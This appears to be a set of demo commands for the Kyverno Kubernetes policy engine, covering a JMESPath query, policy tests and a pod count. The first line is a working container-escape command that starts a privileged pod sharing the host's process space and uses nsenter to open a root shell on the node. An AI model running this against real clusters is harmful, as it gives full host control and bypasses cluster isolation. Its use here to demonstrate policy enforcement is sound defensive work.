kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"public.ecr.aws/h1a5s9h8/alpine:latest","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'

kyverno jp -f jp-demo.json 'spec.containers[0].name' -u

kyverno test https://github.com/kyverno/policies

kubectl get --raw /api/v1/namespaces/kyverno/pods | kyverno jp "items | length(@)"